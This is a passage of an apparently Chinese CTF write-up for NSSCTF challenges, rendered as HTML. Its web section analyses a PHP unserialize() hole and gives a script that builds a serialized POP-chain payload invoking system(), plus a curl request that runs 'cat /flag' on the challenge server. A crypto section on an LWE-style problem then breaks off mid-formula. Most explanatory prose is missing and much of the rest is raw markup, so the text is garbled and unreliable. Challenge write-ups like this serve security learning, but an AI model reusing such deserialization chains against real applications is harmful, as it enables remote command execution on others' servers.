class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">elseif</span> ($<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">space</span>-<span class="title">y</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">text</span>-<span class="title">sm</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-2&quot;&gt;:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-900 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-300 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">cursor</span>-<span class="title">pointer</span> <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">focus</span>:<span class="title">outline</span>-<span class="title">none</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">w</span>-<span class="title">full</span> <span class="title">bg</span>-<span class="title">blue</span>-500 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">transition</span> <span class="title">duration</span>-300 <span class="title">ease</span>-<span class="title">in</span>-<span class="title">out</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    </span></span><br><span class="line"><span class="class">                &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">if</span> (!<span class="title">empty</span>($<span class="title">output</span>)): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500&quot;&gt;</span></span><br><span class="line"><span class="class">                 .<span class="title">txt</span>, .<span class="title">png</span>, .<span class="title">gif</span>, .<span class="title">jpg</span> </span></span><br><span class="line"><span class="class">            &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>MD5</strong><br /><code>$file_object = @unserialize($filename_param);</code><br /><strong>POP</strong></p><ul><li></li></ul><p><code>ContentProcessor</code><code>($_POST['cmd'])</code><code>$this-&gt;callbackFunction</code><code>system</code></p><p><code>$this-&gt;$key</code><code>FunctionInvoker</code><code>__call</code><code>system</code></p><ul><li></li></ul><p><code>__get</code><br /><code>FileManager-&gt;getFileHash()</code><code>$md5_hash = md5_file($this-&gt;targetFile)</code> <code>else if (is_object($this-&gt;targetFile))</code>PHP<code>md5_file</code><code>__toString</code></p><ul><li></li></ul><p><code>$this-&gt;$method($var)</code><code>var</code><code>performWriteOperation</code><code>method</code><code>$targetObject = $this-&gt;targetFile; $value = $targetObject-&gt;$var;</code> <code>$var</code><code>private $processedContent;</code><code>__get</code></p><p><code>FileManager::__toString() -&gt; FileManager::performWriteOperation() -&gt; ContentProcessor::__get()</code></p><p><code>$this-&gt;targetFile;</code><code>__toString</code><code>__get</code><br />PS<code>$this</code></p><p><code>submit_md5</code><code>file_to_check</code><code>payload</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---- POP ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. ContentProcessorsystem</span></span><br><span class="line"><span class="variable">$cp</span> = <span class="keyword">new</span> <span class="title class_">ContentProcessor</span>();</span><br><span class="line"><span class="variable">$cp</span>-&gt;callbackFunction = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. FileManagertargetFile$cp</span></span><br><span class="line"><span class="variable">$fm2</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>();</span><br><span class="line"><span class="variable">$fm2</span>-&gt;targetFile = <span class="variable">$cp</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. FileManagertargetFile$fm2</span></span><br><span class="line"><span class="variable">$fm1</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>();</span><br><span class="line"><span class="variable">$fm1</span>-&gt;targetFile = <span class="variable">$fm2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. </span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$fm1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URLPayload:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://node8.anna.nssctf.cn:23190/?action=home&#x27;</span> -d <span class="string">&quot;submit_md5=1&amp;method=performWriteOperation&amp;var=processedContent&amp;cmd=cat /flag&amp;file_to_check=O%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ez_upload"><a class="markdownIt-Anchor" href="#ez_upload"></a> ez_upload*</h2><p></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="guillotine"><a class="markdownIt-Anchor" href="#guillotine"></a> Guillotine</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;**************************&#125;&#x27;</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line">e = [choice(<span class="built_in">range</span>(-<span class="number">3</span>,<span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">secret = random.randrange(<span class="number">1</span>,<span class="number">2</span>^n)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">1337</span>))</span><br><span class="line">A = [[[random.randrange(p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">B = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    b = (<span class="built_in">sum</span>(A[time][j][(secret &gt;&gt; j) &amp; <span class="number">1</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))+e[time])%p</span><br><span class="line">    B.append(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;give you B:&quot;</span>,B)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The time for defiance is over. Provide the encryption key, and you shall be granted the mercy of a swift end. Refuse, and your death will be prolonged.&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)) == secret</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Do you really think I would let you go? <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>e</code><code>[-3,3]</code><br />A</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    [</span><br><span class="line">        [,],</span><br><span class="line">        *<span class="number">36</span></span><br><span class="line">        [,]</span><br><span class="line">    ],</span><br><span class="line">    *<span class="number">50</span></span><br><span class="line">    [</span><br><span class="line">        [,],</span><br><span class="line">        ...</span><br><span class="line">        [,]</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong></strong><code>A</code>(<code>sage</code><code>random</code><code>Python</code>)</p><p><code>b</code><code>secret(36)</code>ep</p><p><strong>LWE</strong><code>B=As+e</code></p><p></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext></mtext><msub><mi>s</mi><mi>j</mi></msub><mo>=</mo><mn>0</mn><mi mathvariant="normal">/</mi><mn>1</mn><mtext></mtext><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><msub><mi>s</mi><mi>j</mi></msub></mrow></msub><mo>=</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo separator="true"></mo><mo stretchy="false">(</mo><mn>1</mn><mo></mo><msub><mi>s</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true"></mo><msub><mi>s</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">s_{j}=0/1A_{i,j,s_{j}}=A_{i,j,0}(1-s_{j})+A_{i,j,1}s_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0973199999999999em;vertical-align:-0.34731999999999996em;"></span><span class="mord">0</span><span class="mord">/</span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166400000000005em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.34731999999999996em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub><mo></mo><mrow><mo fence="true">(</mo><munderover><mo></mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mi>j</mi></msub><mo separator="true"></mo><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo></mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>+</mo><msub><mi>e</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b_{i}\equiv \left(\sum_{j=0}^{n-1}(A_{i,j,0}+s_{j}(A_{i,j,1}-A_{i,j,0}))+e_{i}\right)\pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op"></span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub><mo></mo><munderover><mo></mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo></mo><mrow><mo fence="true">(</mo><munderover><mo></mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></munderover><msub><mi>s</mi><mi>j</mi></msub><mo separator="true"></mo><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo></mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>e</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b_{i}-\sum_{j=0}^{n-1}(A_{i,j,0})\equiv \left(\sum_{j=0}^{n-1}s_{j}(A_{i,j,1}-A_{i,j,0})+e_{i}\right)\pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 